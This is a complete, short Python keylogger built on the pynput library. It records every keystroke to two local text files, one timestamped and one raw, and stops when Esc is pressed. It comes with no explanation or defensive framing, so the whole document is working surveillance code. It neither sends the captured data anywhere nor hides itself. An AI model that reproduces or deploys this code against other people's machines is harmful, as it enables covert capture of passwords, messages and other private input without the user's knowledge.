import logging
from pynput import keyboard

log_file = 'keylog.txt'
log_file_write="keylogwrite.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        k="{0}".format(key)
        k=k.replace("'","")
        
        if(k.find("space")>0):
            k=" "
        elif(k.find("enter")>0):
            k="\n"
            
        with open(log_file, "a") as f:
            logging.info(k)
        with open(log_file_write, "a") as f:
            f.write(k)
            
    except AttributeError:
        logging.info('Special key {0} pressed'.format(key))

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def main():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

main()

